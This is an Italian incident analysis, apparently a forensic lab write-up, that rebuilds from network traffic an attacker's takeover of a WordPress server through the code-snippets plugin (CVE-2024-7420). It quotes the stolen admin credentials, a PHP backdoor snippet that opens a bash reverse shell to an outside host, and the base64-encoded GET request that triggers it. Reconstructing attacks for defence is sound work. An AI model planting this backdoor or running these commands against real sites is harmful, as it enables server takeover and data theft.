
# CVE-2024-7420 (58.16.78.90 -> 192.168.100.101)

Flussi TCP confermano un’azione potenzialmente malevola da parte di un attore che dispone di privilegi admin, che ha installato il plugin **code-snippets**. Sono state fatte ulteriori analisi per veriicahe sfruttamneti a vulnerabilità note.

## When

| **Evento**                     | **Timestamp** | **TCP Stream** | **Dettagli**                                   |
|--------------------------------|---------------|----------------|-----------------------------------------------|
| Login admin            | 22:45:15.45   | 458            | POST a /wp-login.php con admin:byebye         |
| Installazione plugin           | 22:45:15.80   | 461            | Navigazione e installazione code-snippets     |
| Upload  snippet malevolo  | 22:46:21.03   | 621            | POST con file fancy_rnd.json                  |
| Attivazione  shell remota | 22:47:09.60   | 730            | GET con rand=NTguMTYuNzguOTAvNDQz             |

## Who/Where

| **Ruolo**         | **Indirizzo IP**       | **Porta**       |
|--------------------|------------------------|-----------------|
| Attaccante         | 58.16.78.90           | 51144, 51176, 54012, 44250 |
| Server compromesso | 192.168.100.101       | 80 (srv-www)    |
| Destinazione  reverse shell |  58.16.78.90         | 443             |

## What

1. L’attaccante ha effettuato l’accesso con le stesse credenziali (admin:byebye) rubate nella fase precedente

```sh
    POST /wp-login.php
    ...
    log=admin&pwd=byebye
```

2. Accesso e installazione del plugin attraverso la dashboard WordPress

```sh
    GET /wp-admin/plugins.php
    GET /wp-admin/plugin-install.php
    POST /wp-admin/admin-ajax.php HTTP/1.1
    slug=code-snippets&action=install-plugin&_ajax_nonce=aad5c50a4b&_fs_nonce=&username=&password=&connection_type=&public_key=&private_key=
```

3. Caricamento dello snippet PHP malevolo

    - Lo snippet contiene codice per l’invocazione di una reverse shell su base64-decoded IP/porta.

    ```php
    add_action('init', function() {
        if ( isset($_GET['rand']) ) {
            exec('/bin/bash -c "bash -i >& /dev/tcp/' . base64_decode($_GET['rand']) . ' 0>&1"');
        }
    });
    ```

4. Attivazione della shell

```sh
    GET /?rand=NTguMTYuNzguOTAvNDQz
```

 - echo "NTguMTYuNzguOTAvNDQz" | base64 -d 
 - 58.16.78.90/443
 - Il server WordPress avvia una connessione in uscita verso 58.16.78.90:443, stabilendo una shell Bash interattiva.


## How

- L’attaccante ha sfruttato le credenziali admin modificate nel precedente attacco.
- È stata utilizzata la vulnerabilità  [CVE-2024-7420](https://nvd.nist.gov/vuln/detail/CVE-2024-7420)

## Why

- Ottenere pieno controllo sul server web
- Esfiltrare dati sensibili aziendali
- Possibile installazione di backdoor persistenti


**Filtri Wireshark utilizzati**

```sh
http.request.method == "POST" && http contains "login"
http.request.method == "POST" && http.request.uri contains "code-snippets"
http.request.uri contains "rand="
```